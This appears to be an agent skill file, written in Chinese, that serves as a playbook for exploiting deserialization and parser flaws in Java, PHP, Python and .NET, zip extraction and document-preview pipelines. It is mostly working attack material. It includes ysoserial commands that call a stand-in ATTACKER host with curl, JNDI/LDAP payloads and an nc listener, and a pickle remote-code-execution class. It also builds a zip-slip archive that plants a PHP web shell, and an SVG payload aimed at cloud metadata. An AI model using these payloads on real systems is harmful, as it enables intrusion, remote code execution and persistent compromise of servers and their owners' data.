---
name: deser-and-parser-chains
description: 反序列化与解析器利用（Java gadget / PHP phar+unserialize / Python pickle / .NET / 压缩包-解压链 / 预览转换链）。当意图涉及"序列化数据""反序列化""gadget 链""phar""模板或文档解析"时读本 skill。
---
# 反序列化与解析器链 Playbook

## 0. 先找"序列化数据的入口"

去哪找：
- Cookie / Header / hidden 表单里出现 `rO0AB`（Java base64）、`AC ED 00 05`（Java 二进制头）、`O:8:"stdClass"`（PHP）、`\x80\x04`（pickle）、`AAEAAAD/////`（.NET ViewState）
- 参数值是 base64 且解码后是二进制/JSON 嵌套对象
- 上传的文档/图片/配置被服务端反序列化（不只是解析）：`.ser`、`.session`、缓存文件、MQ 消息体
- 框架特征：Struts2（`OGNL`）、Shiro（`rememberMe`）、Fastjson/Jackson（JSON 多态）、XStream、Kryo

**三步定性质**：
1. 能替换成自己的载荷并观察响应差异 → 有回显点
2. 换垃圾数据看报错 → 报错里有类名/库名 = 反序列化确认成立
3. 无回显 → 走带外（DNS 优先）

## 1. Java 反序列化

```bash
# Shiro rememberMe（最常见）
# cookie 里 rememberMe 值被 AES 加密 → 用公开密钥爆破/已知 key 打
# 容器内：hashcat -m 15500 或 java -jar ysoserial.jar 生成后再加密

# 探测 gadget 可用性（先只发无害 payload：DNS 带外）
java -jar ysoserial.jar URLDNS "http://probe.ATTACKER/" | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/x' | base64 -w0

# 常见链 → 依赖库
CommonsCollections1-7   commons-collections 3.1/4.0
CommonsBeanutils1       commons-beanutils
Spring1/Spring2         spring-core + spring-beans
Groovy1                 groovy
Jdk7u21 / Jdk8u20       JDK 原生（无需三方库）
Hibernate1/2            hibernate-core
```
**判定顺序**：URLDNS 先探"到底有没有反序列化"（无害，只发 DNS）→ 确认后再上 RCE 链。

**Fastjson / Jackson**
```
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER/exp","autoCommit":true}
Jackson 多态: {"@class":"..."} / ["java.lang.Runtime", ...]（enableDefaultTyping 时）
```
配 LDAP/RMI 服务（JNDI 注入）：`kx nc -lvnp 1389` 或用 marshalsec/rogue-jndi 起服务，回连后走本地工厂类绕高版本 JDK 的 trustURLCodebase 限制。

## 2. PHP

```php
// unserialize
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
// 魔术方法链：__wakeup / __destruct / __toString / __call 找可控属性

// phar 反序列化（只要文件操作参数可控就成立，无需 unserialize）
phar://upload/avatar.phar/x.jpg      // 生成 phar 后改名为 jpg 上传，再用 phar:// 触发

// 生成 phar 的要点：PHP >= 8 需去掉 phar.readonly
php -d phar.readonly=0 make.php
```
**利用面**：文件包含（`include $file`）、`file_exists`、`getimagesize`、`unlink` —— 任何吃 `phar://` 的文件函数都会触发元数据反序列化。

POP 链：Laravel（`__destruct` → `PendingBroadcast`）、ThinkPHP、Yii、Monolog（`FingersCrossedHandler`）、Guzzle（`FileCookieJar`）。有源码时用 `phpggc` 直接生成：
```bash
phpggc Laravel/RCE9 system id -b
```

## 3. Python

```python
# pickle（任何 pickle.loads 都可 RCE）
import pickle, os, base64
class E:
    def __reduce__(self): return (os.system, ('id',))
base64.b64encode(pickle.dumps(E()))

# PyYAML（unsafe_load 老版本默认）
!!python/object/apply:os.system ["id"]

# jsonpickle / dill / marshal 同理
```
入口特征：缓存文件、ML 模型文件、session、任务队列消息（Celery/RQ）、`/api/import`。

## 4. .NET

- **ViewState**：无 `MACValidation` 时可用 `ysoserial.net` 生成
  `ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami"`
- **BinaryFormatter / LosFormatter / ObjectStateFormatter**
- **Json.NET** `TypeNameHandling=All` → `$type` 注入
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64
```

## 5. 压缩包 / 解压链（Zip Slip 与解压炸弹）

| 手法 | 做法 |
|---|---|
| Zip Slip | 条目名里写 `../../../../var/www/html/s.php`，应用直接按名字写盘 |
| 符号链接 | tar 里放 symlink 指向 `/etc`，解压后写穿 |
| 解压炸弹 | 小包解出巨量数据 → DoS（谨慎，容易打挂环境） |
| 嵌套解析 | 解压后再被另一个解析器处理（XML/图片）→ 二次 SSRF/XXE |
| 文件覆盖 | 覆盖配置文件/`.htaccess`/cron/启动脚本 → 提权或 RCE |

```bash
# 造一个 zip slip 包
mkdir -p a; echo '<?php system($_GET[c]);?>' > a/s.php
(cd a && zip ../evil.zip s.php)                 # 正常
python3 - <<'PY'
import zipfile
z=zipfile.ZipFile('slip.zip','w')
z.writestr('../../../../var/www/html/s.php','<?php system($_GET[c]);?>')
z.close()
PY
```

## 6. 文档 / 预览 / 转换链

上传 DOCX/XLSX/PDF/SVG → 后端用 LibreOffice/ImageMagick/PDF 渲染 → 可能触发：
- XXE（DOCX 里 `word/document.xml`）
- SSRF（XLSX 外部引用、SVG `<image href>`）
- 命令执行（旧版 ImageMagick `MSL`/`MVG`、`delegate` 配置）
- 路径穿越（PDF 内嵌文件、`/F` 动作）

```xml
<!-- SVG 打 SSRF/XXE -->
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>
```

## 7. 判定与写回

- **反序列化成立**：URLDNS/无害 DNS 带外命中即算"存在反序列化点"，记一条 fact。
- **RCE 成立**：必须有命令真实执行的证据（回显、或带外带回 `id` 输出）。gadget 链"理论上可用"不算。
- 每步单独记：探测点 → 库/版本 → 可用 gadget → 实际执行。串成 finding 时写清依赖条件（JDK 版本、三方库版本）。
